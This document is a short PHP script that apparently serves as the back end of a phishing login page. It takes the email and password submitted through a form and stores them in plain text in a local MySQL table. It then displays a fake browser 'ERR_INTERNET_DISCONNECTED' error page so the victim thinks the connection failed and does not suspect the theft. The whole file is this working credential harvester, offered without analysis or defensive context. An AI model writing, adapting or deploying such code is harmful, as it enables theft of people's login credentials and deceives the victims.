<?php
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Database connection
    $conn = new mysqli('localhost', 'root', '', 'login');
    if ($conn->connect_error) {
        echo "$conn->connect_error";
        die("Connection Failed: " . $conn->connect_error);
    } else {
        $stmt = $conn->prepare("insert into account(email, password) values(?, ?)");
        $stmt->bind_param("ss", $email, $password);
        $execval = $stmt->execute();

        if ($execval) {
            // Output HTML with styling for the updated message
            echo "<div style='text-align: left; margin: 200px 630px;'>"; // Adjust the margin as needed
            echo "<div style='font-size: 42px; font-weight: bold; color: black;'>You're not connected</div>";
            echo "<div style='font-size: 23px; margin-top: 10px; color: black;'>The web just isn't the same without you. Let's get you back online!</div>";
            echo "<div style='font-size: 21px; margin-top: 10px; font-weight: bold; color: black;'>Try:</div>";
            echo "<ul style='font-size: 21px; margin-top: 5px; color: black; list-style: none; padding: 0;'>
                    <li>Running network diagnostics with Get Help</li>
                    <li>Checking your network cables, modem, and routers</li>
                    <li>Reconnecting to your wireless network</li>
                  </ul>";
            echo "<div style='font-size: 12px; margin-top: 10px; color: black;'>ERR_INTERNET_DISCONNECTED</div>";
            echo "</div>";
        } else {
            echo "Login Failed: " . $stmt->error;
        }

        $stmt->close();
        $conn->close();
    }
?>
